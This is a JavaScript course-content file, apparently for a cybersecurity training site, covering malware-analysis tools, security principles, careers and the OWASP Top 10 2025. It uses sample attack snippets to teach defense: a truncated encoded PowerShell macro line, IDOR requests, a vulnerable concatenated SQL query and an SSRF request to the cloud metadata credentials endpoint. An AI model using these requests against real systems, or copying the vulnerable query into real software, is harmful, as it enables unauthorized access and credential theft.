          {title:"The Linux Malware Analysis Workbench", notes:`
            <p><b>REMnux</b> is a specialized Ubuntu-based Linux distribution pre-configured with a comprehensive suite of free, open-source software for reverse-engineering and analyzing malicious code.</p>
            <p>Key tool categories within REMnux:</p>
            <ul>
              <li><b>Static Properties Analysis:</b> Extracting strings, examining headers, calculating hashes (<code>file</code>, <code>strings</code>, <code>pescan</code>, <code>pecheck</code>, <code>diec</code>).</li>
              <li><b>Malicious Document Analysis:</b> Deconstructing malicious Microsoft Office macros and PDFs (<code>oledump.py</code>, <code>pdfid</code>, <code>pdf-parser</code>, <code>vmonkey</code>).</li>
              <li><b>Network Simulation:</b> Simulating Internet services so malware detonating in an isolated lab connects to fake responders (<code>INetSim</code>, <code>fakedns</code>, <code>polarproxy</code>).</li>
              <li><b>Static Disassembly &amp; Decompilation:</b> Reverse engineering binary logic using <b>Ghidra</b>, <b>Radare2</b>, and <b>Cutter</b>.</li>
            </ul>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>Which tool on REMnux simulates common Internet services like HTTP, DNS, and SMTP in an isolated lab?</i> <b>INetSim</b></li>
            </ul>`},

          {title:"Analyzing Malicious Documents with oledump", notes:`
            <p>Attackers commonly distribute malware disguised as invoices using Microsoft Office documents with weaponized VBA macros. On REMnux, analysts use <code>oledump.py</code> to inspect OLE files:</p>
            <pre><code># Analyze streams inside document
oledump.py malicious_invoice.doc

# Indicators:
# Streams marked with uppercase 'M' contain executable VBA Macro code
# A 8:      3841 'VBA/Module1' (Macro code present!)

# Extract and decompile stream 8:
oledump.py -s 8 -v malicious_invoice.doc

# Output reveals malicious PowerShell download cradle:
# Shell("powershell.exe -enc aQB3AHIA...", vbHide)</code></pre>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>Which letter in oledump output signifies that an OLE stream contains VBA macro code?</i> <b>M</b></li>
            </ul>`}
         ]},

        {name:"FlareVM: Arsenal of Tools", text:"Learn the arsenal of investigative tools in FlareVM.",
         icon:"🧰", level:"easy", time:"35 min",
         tasks:[
          {title:"Windows Malware Analysis Environment", notes:`
            <p>While REMnux provides a Linux-based analysis environment, the vast majority of real-world enterprise malware targets Microsoft Windows. <b>FlareVM</b> is a fully scriptable Windows-based security distribution maintained by Mandiant for malware analysis, incident response, and reverse engineering.</p>
            <p>FlareVM transforms a Windows virtual machine into an investigative lab equipped with:</p>
            <ul>
              <li><b>Debuggers:</b> <code>x64dbg</code> and <code>x32dbg</code> for dynamic runtime breakpointing and memory examination.</li>
              <li><b>Disassemblers:</b> Ghidra, IDA Free, and Binary Ninja.</li>
              <li><b>PE Analyzers:</b> <code>PE-bear</code>, <code>CFF Explorer</code>, and <code>Detect It Easy (DIE)</code> for inspecting headers, sections, and digital signatures.</li>
              <li><b>Dynamic Behavioral Monitors:</b> <code>Process Hacker</code>, <code>Sysinternals Suite (Procmon, Procexp, Autoruns)</code>, and <code>RegShot</code>.</li>
            </ul>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>Which debugger tool family in FlareVM is used for interactive assembly debugging of 32-bit and 64-bit Windows binaries?</i> <b>x64dbg</b></li>
            </ul>`},

          {title:"Dynamic Analysis with Procmon & RegShot", notes:`
            <p>Dynamic analysis involves detonating malware in a controlled sandbox while recording all operating system mutations:</p>
            <ul>
              <li><b>Procmon (Process Monitor):</b> Captures real-time file system, registry, process, and thread activity. Analysts use filters (e.g. <code>Process Name is malware.exe</code>) to isolate dropping of secondary payloads and modifications to startup folders.</li>
              <li><b>RegShot:</b> Takes a cryptographic snapshot of the Windows Registry before running malware, and a second snapshot after. Comparing the two instantly reveals persistent run keys (such as <code>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>).</li>
            </ul>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>Which Sysinternals tool monitors and logs real-time file system, registry, and process activity?</i> <b>Procmon</b></li>
            </ul>`}
         ]}
       ]},

      {icon:"💼", title:"Build Your Cyber Security Career", text:"Study the security principles that set the foundation for everything related to cyber security and discover the available careers in cyber.",
       intro:"Learn the core cyber security principles, such as CIA, DAD, security models, defence-in-depth, and zero trust. Finish the module by exploring the different careers in cyber security and the importance of training.",
       rooms:[
        {name:"Security Principles", text:"Learn about the security triad and common security models and principles.",
         icon:"🔒", level:"easy", time:"30 min",
         tasks:[
          {title:"The CIA & DAD Triads", notes:`
            <p>Every security architecture, policy, and control is designed to uphold the <b>CIA Triad</b>:</p>
            <ul>
              <li><b>Confidentiality:</b> Ensuring information is accessible only to authorized entities. Enforced via encryption (AES, RSA), access control lists (ACLs), and multi-factor authentication (MFA).</li>
              <li><b>Integrity:</b> Safeguarding the accuracy and completeness of data, guaranteeing it has not been altered in transit or storage. Enforced via cryptographic hashes (SHA-256) and digital signatures.</li>
              <li><b>Availability:</b> Ensuring authorized users have timely, reliable access to critical information systems and services. Enforced via redundancy, failover clustering, RAID storage, and DDoS protection.</li>
            </ul>
            ${ciaTriadSVG()}
            <p>The inverse adversary perspective is the <b>DAD Triad</b>: <b>Disclosure</b> (violating confidentiality), <b>Alteration</b> (violating integrity), and <b>Denial</b> (violating availability).</p>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>Which component of the CIA triad is safeguarded by cryptographic hashing algorithms?</i> <b>Integrity</b></li>
            </ul>`},

          {title:"Defense-in-Depth & Zero Trust", notes:`
            <p>No single security control is invincible. <b>Defense-in-Depth</b> implements layered defensive controls so that if an attacker breaches the perimeter firewall, internal endpoint defenses, segmentation, and encryption prevent catastrophic loss.</p>
            ${defenseInDepthSVG()}
            <h3>Zero Trust Architecture (ZTA)</h3>
            <p>Traditional network security operated on the <i>castle-and-moat</i> principle (everything inside the corporate LAN was trusted). Modern enterprise security uses <b>Zero Trust</b>, governed by three core axioms:</p>
            <ol>
              <li><b>Verify Explicitly:</b> Always authenticate and authorize based on all available data points (user identity, device health, location, workload).</li>
              <li><b>Use Least Privilege Access:</b> Limit user and application access with Just-In-Time (JIT) and Just-Enough-Access (JEA) policies.</li>
              <li><b>Assume Breach:</b> Minimize blast radius by segmenting networks, encrypting end-to-end, and continuously analyzing telemetry for threat activity.</li>
            </ol>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>What security architecture replaces perimeter trust with the core motto "Never Trust, Always Verify"?</i> <b>Zero Trust</b></li>
            </ul>`}
         ]},

        {name:"Careers in Cyber", text:"Learn about the different careers in cyber security.",
         icon:"🎯", level:"easy", time:"25 min",
         tasks:[
          {title:"The Cyber Security Career Landscape", notes:`
            <p>The cybersecurity domain encompasses diverse specialized career paths aligned across defensive, offensive, and strategic governance tracks:</p>
            <ul>
              <li><b>SOC Analyst (Blue Team):</b> Monitors real-time alerts within a SIEM, performs initial event triage, detects unauthorized intrusions, and coordinates rapid incident containment.</li>
              <li><b>Incident Responder / Forensics Investigator:</b> Investigates confirmed enterprise breaches, performs forensic acquisition of memory and disk drives, analyzes malware artifacts, and reconstructs adversary timelines.</li>
              <li><b>Penetration Tester / Red Teamer:</b> Legally simulates real-world adversary cyber attacks against web applications, internal networks, and physical facilities to uncover and remediate exploitable flaws before threat actors strike.</li>
              <li><b>Security Engineer &amp; Architect:</b> Designs, builds, and maintains defensive security infrastructure, including firewalls, SIEMs, Identity Providers (IdP), and automated detection pipelines.</li>
              <li><b>Governance, Risk &amp; Compliance (GRC) Analyst:</b> Audits organizational systems against regulatory frameworks (ISO 27001, NIST CSF, PCI-DSS, GDPR, HIPAA) to ensure corporate compliance and risk management.</li>
            </ul>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>Which blue-team career role serves on the frontline triaging real-time alerts within a Security Operations Center?</i> <b>SOC Analyst</b></li>
            </ul>`}
         ]},

        {name:"Training Impact on Teams", text:"Discover the impact of training on teams and organisations.",
         icon:"🚀", level:"easy", time:"20 min",
         tasks:[
          {title:"Building Organizational Resilience", notes:`
            <p>Technology alone cannot prevent cyber attacks; people and security culture constitute the critical last line of defense. High-performing security organizations prioritize continuous training:</p>
            <ul>
              <li><b>Hands-On Cyber Ranges &amp; Labs:</b> Real-world technical simulation environments (like TryHackMe) allow defenders and engineers to safely analyze live exploit payloads without risking production outages.</li>
              <li><b>Tabletop Exercises (TTX):</b> Structured scenario-based walk-throughs where executives, legal counsel, and technical responders simulate major breach crises (e.g. ransomware outbreak) to test escalation playbooks.</li>
              <li><b>Measuring SOC Effectiveness:</b>
                <ul>
                  <li><b>MTTD (Mean Time to Detect):</b> Average time elapsed between adversary intrusion and initial detection by analysts.</li>
                  <li><b>MTTR (Mean Time to Respond / Remediate):</b> Average time required to contain, eradicate, and restore compromised systems.</li>
                </ul>
              </li>
            </ul>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>What metric measures the average time required to contain and remediate an incident after detection?</i> <b>MTTR</b></li>
            </ul>`}
         ]}
       ]},

      {icon:"🌐", title:"OWASP Top 10 (2025)", text:"Explore, exploit, and learn how to remediate the most critical web application security risks listed in the OWASP Top 10 (2025) list through interactive labs and practical recommendations.",
       intro:"The OWASP Top 10 list summarises the most common and impactful vulnerabilities found within web applications. This module, divided into three rooms, offers a practical demonstration of how each vulnerability appears; from learning, exploiting, to remediating. The OWASP Top 10 is a cornerstone for cybersecurity professionals and software developers.",
       rooms:[
        {name:"OWASP Top 10 2025: IAAA Failures", text:"Learn about A01, A07, and A09 in how they related to failures in the applied IAAA model.",
         icon:"🛡️", level:"easy", time:"35 min",
         tasks:[
          {title:"The IAAA Framework in Web Security", notes:`
            <p>The <b>IAAA model</b> establishes the cornerstone of access security:</p>
            <ul>
              <li><b>Identification:</b> How a user claims an identity (e.g. username or email).</li>
              <li><b>Authentication:</b> How the system proves that identity (e.g. password, MFA token, WebAuthn biometric).</li>
              <li><b>Authorization:</b> What permissions and resources the authenticated user is allowed to access.</li>
              <li><b>Accountability:</b> Logging actions so every sensitive operation can be traced back to an identifiable actor.</li>
            </ul>
            ${owaspMatrixSVG()}
            <p>When web applications fail to implement these principles rigorously, vulnerabilities emerge across the OWASP Top 10.</p>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>What does the second 'A' stand for in the IAAA security model?</i> <b>Authorization</b></li>
            </ul>`},

          {title:"A01: Broken Access Control & A07: Auth Failures", notes:`
            <p><b>A01: Broken Access Control (Rank #1):</b> Occurs when applications fail to enforce user permission boundaries. Attackers can view sensitive accounts, modify other users' profiles, or access administrative endpoints.</p>
            <p>A classic manifestation is <b>Insecure Direct Object Reference (IDOR)</b>:</p>
            <pre><code># Attacker requests their own invoice:
GET /api/invoices/1042 HTTP/1.1  (Permitted)

# Attacker alters the parameter to view another customer's invoice:
GET /api/invoices/1041 HTTP/1.1  (Vulnerable application responds 200 OK!)</code></pre>
            <p><b>A07: Identification &amp; Authentication Failures:</b> Permitting weak or common passwords, lacking rate-limiting against automated brute-force / credential stuffing attacks, or issuing predictable, exposed session IDs.</p>
            <p><b>A09: Security Logging &amp; Monitoring Failures:</b> Inadequate audit logging of failed logons, high-value transactions, or API errors, leaving security teams blind to active attacks for months.</p>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>Which vulnerability category holds the #1 spot in the OWASP Top 10 web security risks?</i> <b>Broken Access Control</b></li>
            </ul>`}
         ]},

        {name:"OWASP Top 10 2025: Application Design Flaws", text:"Learn about A02, A03, A06, and A10 and how they related to design flaws in the application.",
         icon:"🐛", level:"easy", time:"35 min",
         tasks:[
          {title:"A02: Cryptographic Failures & A03: Injection", notes:`
            <p><b>A02: Cryptographic Failures:</b> Formerly known as Sensitive Data Exposure. Occurs when data in transit (unencrypted HTTP) or data at rest (passwords stored in plaintext or with weak MD5/SHA-1 hashing) is exposed to eavesdropping or theft. Remediate using TLS 1.3, strong cipher suites, and modern adaptive password hashing like <code>bcrypt</code> or <code>Argon2id</code>.</p>
            <p><b>A03: Injection:</b> Occurs when untrusted user input is directly concatenated into a dynamic interpreter (SQL, OS command, LDAP, XPath) without validation or parameterization:</p>
            <pre><code>// Vulnerable dynamic SQL query:
String query = "SELECT * FROM users WHERE user = '" + userInput + "'";

// Secure parameterized SQL query:
PreparedStatement stmt = conn.prepareStatement("SELECT * FROM users WHERE user = ?");
stmt.setString(1, userInput);</code></pre>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>What defensive coding mechanism ensures SQL interpreters treat user input strictly as data rather than executable code?</i> <b>Parameterized queries</b></li>
            </ul>`},

          {title:"A06: Outdated Components & A10: SSRF", notes:`
            <p><b>A06: Vulnerable &amp; Outdated Components:</b> Web applications rely heavily on open-source libraries and frameworks. If third-party dependencies are unpatched, known exploits (such as Log4Shell or Apache Struts RCE) can be automated against the server. Maintain a <i>Software Bill of Materials (SBOM)</i> and automate SCA tools like <code>npm audit</code> or <code>Snyk</code>.</p>
            <p><b>A10: Server-Side Request Forgery (SSRF):</b> The web application fetches a remote resource from a user-supplied URL without validating the destination. An attacker can trick the server into querying internal microservices or cloud metadata endpoints:</p>
            <pre><code># Attack query querying AWS Cloud Instance Metadata:
GET /preview?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role HTTP/1.1</code></pre>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>What cloud link-local IP address is frequently targeted by attackers via SSRF to steal cloud IAM credentials?</i> <b>169.254.169.254</b></li>
            </ul>`}
         ]},

        {name:"OWASP Top 10 2025: Insecure Data Handling", text:"Learn about A04, A05, and A08 as they related to insecure data handling.",
         icon:"💾", level:"easy", time:"30 min",
         tasks:[
          {title:"A04: Insecure Design & A05: Misconfiguration", notes:`
            <p><b>A04: Insecure Design:</b> Focuses on architectural flaws that cannot be fixed by proper implementation alone. If the system design lacks threat modeling, defense boundaries, or business logic validation, even flawless code will remain vulnerable. Defend by integrating <b>STRIDE Threat Modeling</b> and secure architecture reviews into early sprint planning.</p>
            <p><b>A05: Security Misconfiguration:</b> The most commonly seen issue across corporate audits. Examples include default administrative accounts and passwords, unneeded ports/services enabled, verbose error pages displaying detailed stack traces and database versions, and misconfigured cloud storage buckets (e.g. public AWS S3 buckets).</p>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>Which threat modeling framework categorizes threats into Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, and Elevation of Privilege?</i> <b>STRIDE</b></li>
            </ul>`},

          {title:"A08: Software & Data Integrity Failures", notes:`
            <p><b>A08: Software and Data Integrity Failures:</b> Focuses on code and infrastructure that does not protect against integrity violations. Key attack vectors include:</p>
            <ul>
              <li><b>Insecure Deserialization:</b> Untrusted serialized objects passed into applications are unpacked without validation, leading to remote code execution (RCE).</li>
              <li><b>Software Supply Chain Compromise:</b> Applications fetching auto-updates, plugins, or dependencies from unverified CDNs or repositories without verifying digital signatures or cryptographic hashes.</li>
              <li><b>CI/CD Pipeline Insecurity:</b> Compromising code delivery pipelines to introduce malicious backdoors directly into release packages (such as the SolarWinds supply chain breach).</li>
            </ul>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>What attack category involves malicious alterations to third-party software updates or dependencies before they reach the consumer?</i> <b>Supply chain attack</b></li>
            </ul>`}
         ]}
       ]}
    ]
  }
,


  "soc-level-1":        {title:"SOC Level 1", icon:"🔵", level:"easy", track:"Security Analyst"},
  "soc-level-2":        {title:"SOC Level 2", icon:"🟡", level:"mid",  track:"Security Analyst"},
  "advanced-endpoint-investigations": {title:"Advanced Endpoint Investigations", icon:"🔍", level:"hard", track:"Security Analyst"},
  "defending-azure":    {title:"Defending Azure", icon:"☁️", level:"mid", track:"Security Analyst"},
  "windows-ir-forensics":{title:"Windows Incident Response & Forensics", icon:"🪟", level:"hard", track:"Security Analyst"},

  "jr-penetration-tester":{title:"Jr Penetration Tester", icon:"💻", level:"mid", track:"Penetration Tester"},
  "web-application-pentesting":{title:"Web Application Pentesting", icon:"🕷️", level:"mid", track:"Penetration Tester"},
  "web-application-red-teaming":{title:"Web Application Red Teaming", icon:"🕸️", level:"hard", track:"Penetration Tester"},
  "red-teaming":        {title:"Red Teaming", icon:"⚔️", level:"hard", track:"Penetration Tester"},

  "security-engineer":  {title:"Security Engineer", icon:"🏗️", level:"easy", track:"Security Engineer"},
  "devsecops":          {title:"DevSecOps", icon:"♾️", level:"mid", track:"Security Engineer"},
  "defending-aws":      {title:"Defending AWS", icon:"🟧", level:"easy", track:"Security Engineer"},

  "ai-security":        {title:"AI Security", icon:"🤖", level:"mid", track:"AI"}
};

const LEVEL_LABEL = {easy:"Beginner-friendly", mid:"Intermediate", hard:"Advanced"};

/* Roadmap layout (top to bottom) */
const FOUNDATION_STAGES = [
  {title:"Computer Science Basics", text:"Acquire the basic computer science skills required to get started in cyber security.", courses:["pre-security"]},
  {title:"Cyber Security Foundations", text:"Develop cyber security skills needed to enter any career in the industry.", courses:["cyber-security-101"]},
  {title:"Cyber Security Career Skills", text:"Master the specific skills necessary for your career of interest.", courses:[]}
];

const TRACKS = [
  {name:"Security Analyst", cls:"", text:"Get on the fast track to becoming a successful Security Analyst.",
   courses:["soc-level-1","soc-level-2","advanced-endpoint-investigations","defending-azure","windows-ir-forensics"]},
  {name:"Penetration Tester", cls:"", text:"Level up and forge your path to victory as a Penetration Tester.",
   courses:["jr-penetration-tester","web-application-pentesting","web-application-red-teaming","red-teaming"]},
  {name:"Security Engineer", cls:"", text:"Navigate your journey to becoming a world-class Security Engineer.",
   courses:["security-engineer","devsecops","defending-aws"]},
  {name:"AI", cls:"ai", text:"Evolve your skillset and explore the world of AI Security.",
   courses:["ai-security"]}
];

function courseCard(id){
  const c = COURSES[id];
  return `<a class="c-link" href="course.html?id=${id}">
    <div class="c-ico">${c.icon}</div>
    <div class="c-body"><div class="c-title">${c.title}</div>
    <div class="tags"><span class="bars ${c.level}"><i></i><i></i><i></i></span><span class="tag">Path</span></div></div></a>`;
}
function barsHTML(level){return `<span class="bars ${level}"><i></i><i></i><i></i></span>`}

/* URL helpers: modules and rooms are found by slugified name */
function slug(s){return s.toLowerCase().replace(/&/g,"and").replace(/[^a-z0-9]+/g,"-").replace(/^-|-$/g,"")}
function getModule(c, mid){return ((c && c.modules) || []).find(m => slug(m.title) === mid)}
function getRoom(m, rid){return ((m && m.rooms) || []).find(r => slug(r.name) === rid)}
function moduleUrl(cid, m){return `module.html?id=${cid}&m=${slug(m.title)}`}
function roomUrl(cid, m, r){return `room.html?id=${cid}&m=${slug(m.title)}&r=${slug(r.name)}`}
